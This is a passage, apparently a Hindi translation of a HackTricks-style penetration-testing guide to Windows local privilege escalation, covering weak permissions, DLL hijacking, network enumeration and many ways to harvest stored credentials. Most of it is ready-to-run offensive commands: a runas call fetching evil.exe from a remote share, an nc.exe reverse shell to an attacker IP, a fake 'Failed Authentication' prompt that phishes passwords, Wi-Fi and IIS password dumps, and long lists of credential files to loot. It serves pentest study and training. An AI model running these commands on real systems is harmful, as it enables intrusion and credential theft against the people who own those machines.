
जाँचें कि क्या आप किसी config file को संशोधित करके कोई विशेष फ़ाइल पढ़ सकते हैं, या क्या आप किसी binary को संशोधित कर सकते हैं जो Administrator खाते (schedtasks) द्वारा चलाया जाएगा।

System में कमजोर folder/files permissions खोजने का एक तरीका यह है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर रन

**जाँचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी दूसरे user द्वारा executed होगा।**\
**Read** **निम्नलिखित पृष्ठ** को पढ़ें ताकि आप रोचक **autoruns locations to escalate privileges** के बारे में अधिक जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver किसी arbitrary kernel read/write primitive को एक्सपोज़ करता है (खराब तरह से डिज़ाइन किए गए IOCTL handlers में आम), तो आप kernel memory से सीधे एक SYSTEM token चुरा कर privileges escalate कर सकते हैं। चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं तो आप किसी process द्वारा लोड की गई एक DLL को hijack करके **escalate privileges** कर सकते हैं।

PATH के अंदर सभी फ़ोल्डरों के permissions जाँचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहरी से **restricted services** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**इस पेज पर फ़ायरवॉल संबंधित कमांड्स देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

अधिक[ नेटवर्क एन्यूमरेशन के लिए कमांड्स यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user प्राप्त करते हैं तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी port पर listen करने के लिए करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा allow किया जाना चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
रूट के रूप में आसानी से bash शुरू करने के लिए, आप कोशिश कर सकते हैं `--default-user root`

आप `WSL` फ़ाइलसिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

स्रोत: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन user credentials को स्टोर करता है जो servers, websites और अन्य programs के लिए होते हैं जिन्हें **Windows** स्वचालित रूप से उपयोगकर्ता के रूप में लॉग इन कर सकता है। शुरुआत में यह ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के जरिए स्वचालित रूप से लॉग इन हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन credentials को स्टोर करता है जिनके द्वारा **Windows** उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका मतलब है कि कोई भी **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault और लगातार users के username और password दर्ज करने की जगह आपूर्ति किए गए credentials का उपयोग कर सकता है।

जब तक applications Credential Manager के साथ interact नहीं करते, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए credentials का उपयोग कर पाएंगे। इसलिए, अगर आपका application vault का उपयोग करना चाहता है, तो उसे किसी न किसी तरह **communicate with the credential manager and request the credentials for that resource** default storage vault से करना चाहिए।

मशीन पर स्टोर किए गए credentials की सूची देखने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं ताकि saved credentials का उपयोग किया जा सके। निम्न उदाहरण SMB share के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### DPAPI

**Data Protection API (DPAPI)** डेटा के समान-कुंजी एन्क्रिप्शन के लिए एक तरीका प्रदान करता है, जो मुख्यतः Windows ऑपरेटिंग सिस्टम में असममित निजी कुंजियों के समान-कुंजी एन्क्रिप्शन के लिए उपयोग होता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान देने के लिए किसी user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन सीक्रेट्स से व्युत्पन्न एक समान-कुंजी के माध्यम से कुंजियों का एन्क्रिप्शन सक्षम करता है**। सिस्टम एन्क्रिप्शन के परिदृश्यों में, यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए गए उपयोगकर्ता RSA कुंजी `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होती हैं, जहाँ `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI key, उसी फ़ाइल में उपयोगकर्ता की निजी कुंजियों की सुरक्षा करने वाले मास्टर की के साथ सह-स्थित होती है**, आमतौर पर 64 bytes का यादृच्छिक डेटा होता है। (यह ध्यान रखना महत्वपूर्ण है कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, जिससे इसकी सामग्री को CMD में `dir` कमांड के जरिये सूचीबद्ध करना रोका जाता है, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग करके इसे decrypt कर सकते हैं।

The **credentials files protected by the master password** आम तौर पर स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग डिक्रिप्ट करने के लिए कर सकते हैं.\
आप `sekurlsa::dpapi` module का उपयोग करके **memory** से कई **DPAPI** **masterkeys** निकाल सकते हैं (यदि आप root हैं)。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation कार्यों के लिए किया जाता है ताकि encrypted credentials को सुविधाजनक ढंग से स्टोर किया जा सके। ये credentials **DPAPI** द्वारा सुरक्षित होते हैं, जिसका सामान्यतः अर्थ यह है कि इन्हें केवल उन्हीं उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जिस पर इन्हें बनाया गया था।

फाइल में मौजूद PS credentials को **डिक्रिप्ट** करने के लिए आप निम्न कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP Connections

आप इन्हें निम्न स्थानों पर पा सकते हैं:
`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप मेमोरी से कई DPAPI masterkeys को Mimikatz के `sekurlsa::dpapi` module से **extract** कर सकते हैं

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **save passwords** और अन्य जानकारी रखने के लिए करते हैं, यह समझे बिना कि यह एक database फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे खोजने और जांचने लायक हमेशा माना जाना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** configured किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **run with SYSTEM privileges**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** के लिए कमजोर होते हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys `HKCU\Software\OpenSSH\Agent\Keys` रजिस्ट्री कुंजी के अंदर संग्रहीत हो सकती हैं, इसलिए आपको जांचना चाहिए कि वहाँ कुछ रोचक है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस path के अंदर कोई एंट्री पाते हैं तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में स्टोर होती है लेकिन आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके decrypted की जा सकती है.\  
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर ऑटोमैटिक रूप से शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाए, उन्हें `ssh-add` से जोड़ा और ssh के माध्यम से एक मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने असिमेट्रिक कुंजी प्रमाणीकरण के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना देखरेख वाली फाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को खोजने के लिए **metasploit** का भी उपयोग कर सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** हो।

### Cached GPP पासवर्ड

एक सुविधा पहले उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम local administrator खातों को तैनात करने की अनुमति देती थी। हालांकि, इस तरीके में गंभीर सुरक्षा कमियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के अंदर के पासवर्ड, जो सार्वजनिक रूप से दस्तावेजीकृत default key का उपयोग करके AES256 से एन्क्रिप्ट थे, किसी भी authenticated user द्वारा डिक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम था, क्योंकि इससे उपयोगकर्ता elevated privileges प्राप्त कर सकते थे।

इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया जो locally cached GPP फ़ाइलों के लिए स्कैन करता है जिनमें खाली नहीं होने वाला "cpassword" फ़ील्ड मौजूद हो। ऐसी फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को डिक्रिप्ट करता है और एक custom PowerShell object लौटाता है। इस object में GPP और फ़ाइल के स्थान के बारे में विवरण शामिल होते हैं, जो इस सुरक्षा कमजोरी की पहचान और निवारण में मदद करते हैं।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config के साथ credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

यदि आपको लगता है कि वह उन्हें जानता होगा तो आप हमेशा उपयोगकर्ता से उसके **credentials** या किसी अन्य उपयोगकर्ता के **credentials** दर्ज करने के लिए पूछ सकते हैं (ध्यान दें कि क्लाइंट से सीधे **पूछना** कि उसके **credentials** क्या हैं वास्तव में **जोखिमभरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जो credentials रख सकते हैं**

जानी-पहचानी फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी जाँचना चाहिए ताकि इसके अंदर credentials की तलाश की जा सके

कई प्रोग्रामों द्वारा सेव किए गए पासवर्ड **पुनर्प्राप्त** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**अन्य संभावित registry keys जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र्स इतिहास

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
ब्राउज़रों के history, bookmarks और favourites भी चेक करें क्योंकि संभवतः कुछ **passwords are** वहाँ स्टोर हो सकते हैं।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर बनी एक तकनीक है जो अलग-अलग भाषाओं के software components के बीच intercommunication की अनुमति देती है। प्रत्येक COM component को एक class ID (CLSID) के माध्यम से पहचान दिया जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को मर्ज करके बनाया जाता है।

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

